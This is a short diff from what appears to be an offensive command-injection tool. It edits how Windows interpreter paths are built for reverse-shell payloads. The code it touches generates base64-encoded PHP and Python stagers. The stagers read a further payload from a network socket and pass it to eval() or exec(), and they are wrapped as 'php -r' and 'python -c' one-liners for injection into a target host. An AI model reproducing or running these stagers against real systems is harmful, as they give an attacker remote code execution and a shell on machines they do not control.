@@ -182,7 +182,7 @@ $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len)
 case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
-        other_shell = settings.WIN_PHP_DIR + "php.exe -r \"eval(base64_decode(" +other_shell+ "));\""
+        other_shell = settings.WIN_PHP_DIR + " -r \"eval(base64_decode(" +other_shell+ "));\""
       else:
         other_shell = "php -r \"eval(base64_decode(" +other_shell+ "));\""
       break
@@ -199,7 +199,7 @@ while len(d)!=l:
 exec(d,{'s':s})"""      
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
-        other_shell = settings.WIN_PYTHON_DIR + "python.exe -c \"exec('" +other_shell+ "'.decode('base64'))\""
+        other_shell = settings.WIN_PYTHON_DIR + " -c \"exec('" +other_shell+ "'.decode('base64'))\""
       else:
         other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
       break
